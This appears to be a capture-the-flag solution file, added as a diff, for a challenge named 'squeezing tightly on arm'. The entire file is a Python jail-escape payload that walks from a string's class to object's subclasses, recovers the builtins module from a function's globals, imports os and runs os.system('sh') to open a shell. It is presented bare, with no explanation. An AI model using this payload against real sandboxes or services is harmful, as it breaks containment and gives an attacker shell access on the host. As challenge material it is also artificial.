@@ -1,0 +1,11 @@
+# tbtl-na_squeezing_tightly_on_arm__solution
+
+[a:="".__class__]
+[b:=a.__base__]
+[c:=b.__subclasses__()]
+[d:=[x.__init__ for x in c]]
+[e:=[x for x in d if "wrapper" not in f"{x}"]]
+[f:=[x for x in e if "builtins" in x.__globals__ ]]
+[g:=f[0].__globals__["builtins"]]
+[h:=g.__import__("os")]
+h.system("sh")
